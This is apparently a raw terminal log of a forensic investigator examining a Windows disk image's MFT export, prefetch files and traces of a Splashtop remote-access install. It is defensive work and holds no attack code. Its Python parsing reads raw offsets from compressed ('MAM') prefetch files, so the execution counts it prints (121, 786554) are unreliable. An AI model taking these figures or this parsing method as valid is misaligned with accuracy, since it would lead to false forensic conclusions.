86885,Valid,In Use,File,1,3491,0,Package_5_for_KB4486553~31bf3856ad364e35~amd64~~10.0.1.2353.mum,,2019-03-19T10:55:19.196Z,2019-01-08T23:32:08.631Z,2025-11-24T12:28:11.278Z,2019-03-19T10:55:24.227Z,2019-03-19T10:55:19.196Z,2019-01-08T23:32:08.631Z,2019-03-19T10:55:19.196Z,2019-03-19T10:55:18.305Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 3096224743817216, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
86886,Valid,In Use,File,1,3491,0,PA2C72~1.CAT,,2019-03-19T10:55:19.196Z,2019-01-08T23:33:25.769Z,2025-11-24T10:37:56.127Z,2019-03-19T10:55:24.227Z,2019-03-19T10:55:19.196Z,2019-01-08T23:33:25.769Z,2019-03-19T10:55:24.227Z,2019-03-19T10:55:24.227Z,,,,,True,False,True,False,False,False,False,False,False,False,False,False,False,[],None,,None,None,None,None,None,None,None,None,None,,,,
86890,Valid,In Use,File,1,0,0,,,2019-03-19T10:55:19.258Z,2019-01-08T23:33:25.737Z,2025-11-24T10:38:00.374Z,2019-03-19T10:55:28.649Z,Not defined,Not defined,Not defined,Not defined,,,,,True,True,False,False,False,False,False,False,False,False,False,False,False,"[{'type': 16, 'name': '', 'vcn': 0, 'reference': 86890}, {'type': 48, 'name': '', 'vcn': 0, 'reference': 86743}, {'type': 48, 'name': '', 'vcn': 0, 'reference': 86743}, {'type': 48, 'name': '', 'vcn': 0, 'reference': 86743}, {'type': 48, 'name': '', 'vcn': 0, 'reference': 86743}, {'type': 128, 'name': '', 'vcn': 0, 'reference': 86743}]",None,,None,None,None,None,None,None,None,None,None,,,,
86891,Valid,In Use,File,1,3491,0,Package_8_for_KB4486553~31bf3856ad364e35~amd64~~10.0.1.2353.mum,,2019-03-19T10:55:19.258Z,2019-01-08T23:32:08.631Z,2025-11-24T12:28:11.297Z,2019-03-19T10:55:24.305Z,2019-03-19T10:55:19.258Z,2019-01-08T23:32:08.631Z,2019-03-19T10:55:19.258Z,2019-03-19T10:55:18.274Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 2533274790395904, 'last_vcn': 3}",None,None,None,None,None,None,None,,,,
grep: (standard input): binary file matches
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ strings 7ZFM.EXE-7C92DCA0.pf | head -50
strings: '7ZFM.EXE-7C92DCA0.pf': No such file
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ ls -laR * | grep -i "7ZFM.EXE-7C92DCA0.pf"                                       
-rw-rw-r-- 1 fixit42 fixit42  9007 Nov 24 14:25 7ZFM.EXE-7C92DCA0.pf
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ ls -laR * | grep -i -C10 "7ZFM.EXE-7C92DCA0.pf"                                          
drwxrwxr-x 8 fixit42 fixit42    4096 Nov 25 12:29 ..
-rw-rw-r-- 1 fixit42 fixit42    1211 Nov 24 14:26 setupapi.dev.log
-rw-rw-r-- 1 fixit42 fixit42 5884987 Sep 15  2018 setupapi.offline.20180915_003333.log
-rw-rw-r-- 1 fixit42 fixit42   19578 Mar 19  2019 setupapi.setup.log

Windows/prefetch:
total 3668
drwxrwxr-x 2 fixit42 fixit42 16384 Nov 25 12:29 .
drwxrwxr-x 8 fixit42 fixit42  4096 Nov 25 12:29 ..
-rw-rw-r-- 1 fixit42 fixit42  6142 Nov 24 14:25 7Z2501-X64.EXE-36B52C5B.pf
-rw-rw-r-- 1 fixit42 fixit42  9007 Nov 24 14:25 7ZFM.EXE-7C92DCA0.pf
-rw-rw-r-- 1 fixit42 fixit42 12583 Nov 24 14:21 8-0-11.EXE-3017F841.pf
-rw-rw-r-- 1 fixit42 fixit42 25489 Nov 24 14:21 8-0-11.EXE-5062E074.pf
-rw-rw-r-- 1 fixit42 fixit42 11548 Nov 24 14:22 8-0-11.EXE-8356CA5C.pf
-rw-rw-r-- 1 fixit42 fixit42  8625 Nov 24 14:22 8-0-11.EXE-DA9D95D2.pf
-rw-rw-r-- 1 fixit42 fixit42 21946 Nov 24 14:20 AGENTPACKAGEADREMOTE.EXE-1E10CE75.pf
-rw-rw-r-- 1 fixit42 fixit42 17638 Nov 24 14:32 AGENTPACKAGEAGENTINFORMATION.-E39A050D.pf
-rw-rw-r-- 1 fixit42 fixit42 21129 Nov 24 14:23 AGENTPACKAGEHEARTBEAT.EXE-022FA0BB.pf
-rw-rw-r-- 1 fixit42 fixit42 17129 Nov 24 14:36 AGENTPACKAGEINTERNALPOLLER.EX-D51AC799.pf
-rw-rw-r-- 1 fixit42 fixit42 19299 Nov 24 14:20 AGENTPACKAGEMARKETPLACE.EXE-F44813D5.pf
-rw-rw-r-- 1 fixit42 fixit42 32976 Nov 24 14:30 AGENTPACKAGEMONITORING.EXE-CDAD70DF.pf
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ strings Windows/prefetch/7ZFM.EXE-7C92DCA0.pf | head -50
8iP8
GG.\
Thp]
jJvF
l0jr
D" 0
13 @
FE@`
240P
240P
`p @
8`rA
F -P:
        `o@
82(B
(mvPB)6
 d }
R#(e
13 @
kq<~+{
i@N@v-
gQlH
P(%O
D" 0
BQ (
#Qrh
DFP(
`8@qA
^m`^
46Pp
@P  
p:P|`u
35@`
35@`
E-`H
pt `
14 P
35@`
u?P($|A
G+8|
8(zpq0
H=D<h
p7N^@
*cFH
(E?Q
|FR){
0RPd
2B`X
-2HP
(pL@
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ strings Windows/prefetch/7ZFM.EXE-7C92DCA0.pf           
8iP8
GG.\
Thp]
jJvF
l0jr
D" 0
13 @
FE@`
240P
240P
`p @
8`rA
F -P:
        `o@
82(B
(mvPB)6
 d }
R#(e
13 @
kq<~+{
i@N@v-
gQlH
P(%O
D" 0
BQ (
#Qrh
DFP(
`8@qA
^m`^
46Pp
@P  
p:P|`u
35@`
35@`
E-`H
pt `
14 P
35@`
u?P($|A
G+8|
8(zpq0
H=D<h
p7N^@
*cFH
(E?Q
|FR){
0RPd
2B`X
-2HP
(pL@
pv@L 1
 9Xr
H0`qA
]0vA
`       6O
Ea`b
X>8;
P(Iq
P(%M
@=(P"
jFw@<"q
478c
bf@`
{@{p~
@*<>
$" 0
pt `
040P
$kYl
8@r~
f*Z&
}@}Vl
35@`
b]^h
: u`
|`|Ul
sPv{
DD0 
B" e
13 @
=x=H=h=
rR0e
 1Ha
DE@`
 HmJ
a;@!
13 @
A?J~
J4R<%H
<`1\
<jjrh
1o{ ~
H9Ft
QbR79V
b9>Q'
z"h%
%7;9
RS`l
IXkOd6
HR1Z
d[T*
+_/j
a?Iku
'9]L}
JJ+(1A
aa.fN
jU~X
YMU
%qKXmq
iLb0C
Y{,1
%2U:(
")G%
/0tqx
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ strings Windows/prefetch/7ZFM.EXE-7C92DCA0.pf
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ hexdump -C Windows/prefetch/7ZFM.EXE-7C92DCA0.pf | grep -A2 -B2 "00000090"
00000070  ba b8 a9 bb bb c7 ba ab  ba b8 ba ac ba b7 c9 bb  |................|
00000080  bb c7 b9 ab ba b8 ba 8a  0d 00 00 00 00 00 00 00  |................|
00000090  0c 00 00 00 00 00 00 d0  79 00 00 00 00 00 00 00  |........y.......|
000000a0  99 a6 02 00 00 00 00 d0  a8 b9 d7 00 00 00 00 b0  |................|
000000b0  a6 9b d8 00 0c 00 bb b0  98 bb b9 d0 dd 00 ac a0  |................|
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ dd if=Windows/prefetch/7ZFM.EXE-7C92DCA0.pf bs=1 count=4 skip=152 2>/dev/null | hexdump -C
00000000  79 00 00 00                                       |y...|
00000004
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ python3 -c "
import struct
with open('Windows/prefetch/7ZFM.EXE-7C92DCA0.pf', 'rb') as f:
    f.seek(152)  # Offset to execution count
    count = struct.unpack('<I', f.read(4))[0]
    print(f'Execution count: {count}')
"
Execution count: 121
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ >....                                                                                                                     

with open('Windows/prefetch/7ZFM.EXE-7C92DCA0.pf', 'rb') as f:
    # Read signature
    sig = f.read(4)
    print(f'Signature: {sig}')
    
    # Go to execution count (offset 0x98 = 152 decimal)
    f.seek(152)
    exec_count = struct.unpack('<I', f.read(4))[0]
    print(f'Execution count: {exec_count}')
    
    # Last execution time (offset 0x90 = 144 decimal)
    f.seek(144)
    last_exec = struct.unpack('<Q', f.read(8))[0]
    
    # Convert Windows FILETIME to readable time
    if last_exec > 0:
        # Windows FILETIME is 100-nanosecond intervals since 1601-01-01
        epoch_start = datetime.datetime(1601, 1, 1)
        microseconds = last_exec / 10
        last_exec_time = epoch_start + datetime.timedelta(microseconds=microseconds)
        print(f'Last execution: {last_exec_time}')
    
    # Also check for multiple execution times (Win10 stores last 8)
    f.seek(128)  # Start of execution times array
    exec_times = []
    for i in range(8):
        ft = struct.unpack('<Q', f.read(8))[0]
        if ft > 0:
            exec_times.append(ft)
    print(f'Number of recorded execution times: {len(exec_times)}')
"
Signature: b'MAM\x04'
Execution count: 121
Traceback (most recent call last):
  File "<string>", line 24, in <module>
    last_exec_time = epoch_start + datetime.timedelta(microseconds=microseconds)
                     ~~~~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
OverflowError: date value out of range
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ xxd -s 152 -l 4 Windows/prefetch/7ZFM.EXE-7C92DCA0.pf
00000098: 7900 0000                                y...
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ xxd -s 128 -l 64 Windows/prefetch/7ZFM.EXE-7C92DCA0.pf
00000080: bbc7 b9ab bab8 ba8a 0d00 0000 0000 0000  ................
00000090: 0c00 0000 0000 00d0 7900 0000 0000 0000  ........y.......
000000a0: 99a6 0200 0000 00d0 a8b9 d700 0000 00b0  ................
000000b0: a69b d800 0c00 bbb0 98bb b9d0 dd00 aca0  ................
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ hexdump -C 7ZFM.EXE-7C92DCA0.pf | grep -i "2025\|2024\|date\|time"
hexdump: 7ZFM.EXE-7C92DCA0.pf: No such file or directory
hexdump: all input file arguments failed
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ hexdump -C Windows/prefetch/7ZFM.EXE-7C92DCA0.pf | grep -i "2025\|2024\|date\|time"
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ 
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ ls -la Windows/prefetch/7ZFM.EXE-7C92DCA0.pf
-rw-rw-r-- 1 fixit42 fixit42 9007 Nov 24 14:25 Windows/prefetch/7ZFM.EXE-7C92DCA0.pf
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ xxd -s 0 -l 200 Windows/prefetch/7ZFM.EXE-7C92DCA0.pf
00000000: 4d41 4d04 069d 0000 a5b7 a5aa a9b7 a9a9  MAM.............
00000010: aac7 b9aa aaa7 b9aa bac7 baaa b9b7 a9b9  ................
00000020: 99a7 a999 a9b7 b9a9 8997 9889 99b7 9899  ................
00000030: a897 9899 a9c7 a89a bac7 a9ab bac7 baab  ................
00000040: bad7 b9ab bab7 baaa bbb7 baaa baa7 daaa  ................
00000050: bab7 dabb bab7 b9aa bab7 daba bab7 baab  ................
00000060: baa7 b9ab a9b7 babb a9c8 c9ab bac8 b9ab  ................
00000070: bab8 a9bb bbc7 baab bab8 baac bab7 c9bb  ................
00000080: bbc7 b9ab bab8 ba8a 0d00 0000 0000 0000  ................
00000090: 0c00 0000 0000 00d0 7900 0000 0000 0000  ........y.......
000000a0: 99a6 0200 0000 00d0 a8b9 d700 0000 00b0  ................
000000b0: a69b d800 0c00 bbb0 98bb b9d0 dd00 aca0  ................
000000c0: 98ab a8d0 dc00 9b8d                      ........
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ python3 -c "
import struct
with open('Windows/prefetch/7Z2501-X64.EXE-36B52C5B.pf', 'rb') as f:
    f.seek(152)
    count = struct.unpack('<I', f.read(4))[0]
    print(f'7Z2501-X64.EXE execution count: {count}')
"
7Z2501-X64.EXE execution count: 786554
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ hexdump -C Windows/prefetch/7ZFM.EXE-7C92DCA0.pf | grep -i "d4 01"  # 2025 in FILETIME often has d4 01
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ hexdump -C Windows/prefetch/7ZFM.EXE-7C92DCA0.pf | grep -i "d401"  # 2025 in FILETIME often has d4 01 
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ strings -el Windows/prefetch/7ZFM.EXE-7C92DCA0.pf | grep -i "\.zip\|\.7z\|\.rar\|archive"
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ ls -laR * | grep .exe                                                                                     
drwxrwxr-x  2 fixit42 fixit42 4096 Nov 25 12:28 AppCrash_dwm.exe_3da94835167487cec878c8d167d91ee4f35ec10_41746857_cab_17f38c62
drwxrwxr-x  2 fixit42 fixit42 4096 Nov 25 12:28 AppCrash_dwm.exe_ab70d4f6424568ec6cccf22ed535b275030334d_41746857_cab_091237c2
ProgramData/Microsoft/Windows/WER/ReportQueue/AppCrash_dwm.exe_3da94835167487cec878c8d167d91ee4f35ec10_41746857_cab_17f38c62:
ProgramData/Microsoft/Windows/WER/ReportQueue/AppCrash_dwm.exe_ab70d4f6424568ec6cccf22ed535b275030334d_41746857_cab_091237c2:
-rw-rw-r-- 1 fixit42 fixit42  875 Mar 19  2019 choco.exe.log
-rw-rw-r-- 1 fixit42 fixit42 3143 Nov 24 11:53 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42 5714 Nov 24 11:28 PowerShell_ISE.exe.log
-rw-rw-r-- 1 fixit42 fixit42  517 Nov 24 13:28 NGenTask.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1692576 Nov 24 11:08 MicrosoftEdgeSetup[1].exe
drwxrwxr-x 2 fixit42 fixit42 4096 Nov 25 12:29 Indexed DB
Users/IEUser/AppData/Local/Packages/Microsoft.MicrosoftEdge_8wekyb3d8bbwe/AppData/User/Default/Indexed DB:
-rw-rw-r-- 1 fixit42 fixit42 2621440 Nov 24 12:03 IndexedDB.edb
-rw-rw-r-- 1 fixit42 fixit42   16384 Nov 24 11:22 IndexedDB.jfm
-rw-rw-r-- 1 fixit42 fixit42 2909 Nov 24 13:21 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42 5664 Nov 24 13:28 sdiagnhost.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1837 Nov 24 13:42 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42 3000 Nov 24 14:25 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1829 Nov 24 14:19 AgentPackageADRemote.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1823 Nov 24 14:19 AgentPackageAgentInformation.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1674 Nov 24 14:19 AgentPackageHeartbeat.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1743 Nov 24 14:19 AgentPackageInternalPoller.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1812 Nov 24 14:19 AgentPackageMarketplace.exe.log
-rw-rw-r-- 1 fixit42 fixit42 3339 Nov 24 14:20 AgentPackageMonitoring.exe.log
-rw-rw-r-- 1 fixit42 fixit42 2329 Nov 24 14:28 AgentPackageOsUpdates.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1812 Nov 24 14:22 AgentPackageRuntimeInstaller.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1606 Nov 24 14:20 AgentPackageSTRemote.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1269 Nov 24 14:19 AgentPackageSystemTools.exe.log
-rw-rw-r-- 1 fixit42 fixit42 1378 Nov 24 14:21 AgentPackageTicketing.exe.log
-rw-rw-r-- 1 fixit42 fixit42  517 Nov 24 10:59 NGenTask.exe.log
-rw-rw-r-- 1 fixit42 fixit42 3824 Nov 24 13:56 powershell.exe.log
-rw-rw-r-- 1 fixit42 fixit42  651 Nov 24 14:17 rundll32.exe.log
-rw-rw-r-- 1 fixit42 fixit42  226 Nov 24 10:59 taskhostw.exe.log
-rw-rw-r-- 1 fixit42 fixit42  847 Nov 24 12:23 tzsync.exe.log
-rw-rw-r--  1 fixit42 fixit42 2756 Mar 19  2019 IndexerAutomaticMaintenance
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ grep -a -i 'Splashtop' mft.csv                                                                            
82401,Valid,In Use,Directory,8,1591,0,Splashtop,,2025-11-24T13:36:35.403Z,2025-11-24T13:37:14.162Z,2025-11-24T13:38:04.052Z,2025-11-24T13:37:14.162Z,2025-11-24T13:36:35.403Z,2025-11-24T13:36:35.403Z,2025-11-24T13:36:35.403Z,2025-11-24T13:36:35.403Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,False,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,None,,,,
150516,Valid,In Use,File,1,150117,0,throttle_SplashtopNotInstalled.txt,,2025-11-24T13:19:11.305Z,2025-11-24T13:19:11.305Z,2025-11-24T13:19:11.305Z,2025-11-24T13:19:11.305Z,2025-11-24T13:19:11.305Z,2025-11-24T13:19:11.305Z,2025-11-24T13:19:11.305Z,2025-11-24T13:19:11.305Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': False, 'content_size': 0, 'start_vcn': None, 'last_vcn': None}",None,None,None,None,None,None,None,,,,
150774,Valid,In Use,File,1,5545,0,SplashtopStreamer.exe,,2025-11-24T13:19:45.102Z,2025-11-24T13:21:07.565Z,2025-11-24T13:35:49.025Z,2025-11-24T13:21:07.565Z,2025-11-24T13:19:45.102Z,2025-11-24T13:19:45.102Z,2025-11-24T13:19:45.102Z,2025-11-24T13:19:45.102Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 18324}",None,None,None,None,None,None,None,,,,
151015,Valid,In Use,File,1,80798,0,SPLASHTOPSTREAMER.EXE-602ACF3C.pf,,2025-11-24T13:21:42.856Z,2025-11-24T13:35:48.211Z,2025-11-24T13:38:47.500Z,2025-11-24T13:35:48.211Z,2025-11-24T13:21:42.856Z,2025-11-24T13:21:42.856Z,2025-11-24T13:21:42.856Z,2025-11-24T13:21:42.856Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 3}",None,None,None,None,None,None,None,,,,
151300,Valid,In Use,File,2,725,0,{7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}_Splashtop_Splashtop Remote_Server_SRSerer_exe,,2025-11-24T13:37:38.428Z,2025-11-24T13:37:39.616Z,2025-11-24T13:37:39.616Z,2025-11-24T13:37:39.616Z,2025-11-24T13:37:38.428Z,2025-11-24T13:37:38.428Z,2025-11-24T13:37:38.428Z,2025-11-24T13:37:38.428Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 9}",None,None,None,None,None,None,None,,,,
152976,Valid,In Use,File,1,152517,0,Splashtop-Splashtop Streamer-Remote Session-Operational_Splashtop-Splashto Streamer-Remote Session_1000.map,,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2025-11-24T13:30:40.669Z,2025-11-24T13:30:40.669Z,2025-11-24T13:30:40.669Z,2025-11-24T13:30:40.669Z,2025-11-24T13:30:40.669Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 1}",None,None,None,None,None,None,None,,,,
152977,Valid,In Use,File,1,152517,0,Splashtop-Splashtop Streamer-Remote Session-Operational_Splashtop-Splashto Streamer-Remote Session_1001.map,,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2025-11-24T13:30:40.717Z,2025-11-24T13:30:40.712Z,2025-11-24T13:30:40.712Z,2025-11-24T13:30:40.712Z,2025-11-24T13:30:40.712Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
152978,Valid,In Use,File,1,152517,0,Splashtop-Splashtop Streamer-Remote Session-Operational_Splashtop-Splashto Streamer-Remote Session_1100.map,,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2025-11-24T13:30:40.761Z,2025-11-24T13:30:40.761Z,2025-11-24T13:30:40.761Z,2025-11-24T13:30:40.761Z,2025-11-24T13:30:40.761Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
152979,Valid,In Use,File,1,152517,0,Splashtop-Splashtop Streamer-Remote Session-Operational_Splashtop-Splashto Streamer-Remote Session_1101.map,,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2025-11-24T13:30:40.808Z,2025-11-24T13:30:40.808Z,2025-11-24T13:30:40.808Z,2025-11-24T13:30:40.808Z,2025-11-24T13:30:40.808Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
152980,Valid,In Use,File,1,152517,0,Splashtop-Splashtop Streamer-Remote Session-Operational_Splashtop-Splashto Streamer-Remote Session_1110.map,,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2025-11-24T13:30:40.865Z,2025-11-24T13:30:40.865Z,2025-11-24T13:30:40.865Z,2025-11-24T13:30:40.865Z,2025-11-24T13:30:40.865Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
152981,Valid,In Use,File,1,152517,0,Splashtop-Splashtop Streamer-Remote Session-Operational_Splashtop-Splashto Streamer-Remote Session_1111.map,,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2022-12-08T19:20:46.000Z,2025-11-24T13:30:40.889Z,2025-11-24T13:30:40.889Z,2025-11-24T13:30:40.889Z,2025-11-24T13:30:40.889Z,2025-11-24T13:30:40.889Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
153639,Valid,In Use,File,1,151414,0,Splashtop.tkape,,2024-02-20T15:56:52.000Z,2024-02-20T15:56:52.000Z,2025-11-24T13:38:04.052Z,2025-11-24T13:31:19.978Z,2025-11-24T13:31:19.978Z,2025-11-24T13:31:19.978Z,2025-11-24T13:31:19.978Z,2025-11-24T13:31:19.978Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
154358,Valid,In Use,Directory,3,1490,0,Splashtop,,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,2025-11-24T13:38:04.052Z,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,False,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,None,,,,
154382,Valid,In Use,Directory,5,82401,0,Splashtop Remote Server,,2025-11-24T13:37:14.162Z,2025-11-24T13:37:14.162Z,2025-11-24T13:37:14.162Z,2025-11-24T13:37:14.162Z,2025-11-24T13:37:14.162Z,2025-11-24T13:37:14.162Z,2025-11-24T13:37:14.162Z,2025-11-24T13:37:14.162Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,False,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,None,,,,
154426,Valid,In Use,Directory,3,154358,0,Splashtop Remote,,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,2025-11-24T13:38:04.052Z,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,2025-11-24T13:36:17.010Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,False,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,None,,,,
154454,Valid,In Use,File,4,154453,0,splashtop.bl,,2025-11-24T13:36:50.535Z,2025-11-24T13:36:50.535Z,2025-11-24T13:36:50.535Z,2025-11-24T13:36:50.535Z,2025-11-24T13:36:50.535Z,2025-11-24T13:36:50.535Z,2025-11-24T13:36:50.535Z,2025-11-24T13:36:50.535Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': False, 'content_size': 76, 'start_vcn': None, 'last_vcn': None}",None,None,None,None,None,None,None,,,,
154470,Valid,In Use,File,2,130095,0,{7C5A40EF-A0FB-4BFC-874A-C0F2E0B9FA8E}_Splashtop_Splashtop Remote_Server_SRSerer_exe,,2025-11-24T13:37:39.447Z,2025-11-24T13:37:41.068Z,2025-11-24T13:37:41.068Z,2025-11-24T13:37:41.068Z,2025-11-24T13:37:39.447Z,2025-11-24T13:37:39.447Z,2025-11-24T13:37:39.447Z,2025-11-24T13:37:39.447Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 9}",None,None,None,None,None,None,None,,,,
154950,Valid,In Use,Directory,1,1688,0,Splashtop Remote,,2025-11-24T13:36:32.672Z,2025-11-24T13:36:32.684Z,2025-11-24T13:37:32.725Z,2025-11-24T13:36:32.684Z,2025-11-24T13:36:32.672Z,2025-11-24T13:36:32.672Z,2025-11-24T13:36:32.672Z,2025-11-24T13:36:32.672Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,False,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,None,,,,
154951,Valid,In Use,File,1,154950,0,Splashtop Streamer.lnk,,2025-11-24T13:36:32.684Z,2025-11-24T13:36:32.684Z,2025-11-24T13:37:39.351Z,2025-11-24T13:36:32.684Z,2025-11-24T13:36:32.684Z,2025-11-24T13:36:32.684Z,2025-11-24T13:36:32.684Z,2025-11-24T13:36:32.684Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 0}",None,None,None,None,None,None,None,,,,
154955,Valid,In Use,File,2,4667,0,Splashtop-Splashtop Streamer-Status%4Operational.evtx,,2025-11-24T13:36:39.045Z,2025-11-24T13:36:39.045Z,2025-11-24T13:36:39.045Z,2025-11-24T13:36:39.045Z,2025-11-24T13:36:39.045Z,2025-11-24T13:36:39.045Z,2025-11-24T13:36:39.045Z,2025-11-24T13:36:39.045Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 0, 'last_vcn': 16}",None,None,None,None,None,None,None,,,,
154965,Valid,In Use,File,1,4667,0,Splashtop-Splashtop Streamer-Remote Session%4Operational.evtx,,2025-11-24T13:36:39.459Z,2025-11-24T13:36:39.459Z,2025-11-24T13:36:39.459Z,2025-11-24T13:36:39.459Z,2025-11-24T13:36:39.459Z,2025-11-24T13:36:39.459Z,2025-11-24T13:36:39.459Z,2025-11-24T13:36:39.459Z,,,,,True,False,True,False,False,True,False,False,False,False,False,False,False,[],None,,None,"{'name': '', 'non_resident': True, 'content_size': None, 'start_vcn': 1125899906842624, 'last_vcn': 16}",None,None,None,None,None,None,None,,,,
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ cd users                        
cd: no such file or directory: users
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs]
└─$ cd Users 
                                                                                                                              
┌──(fixit42㉿kali)-[~/Downloads/Logs/Users]
└─$ ls -la               
total 28
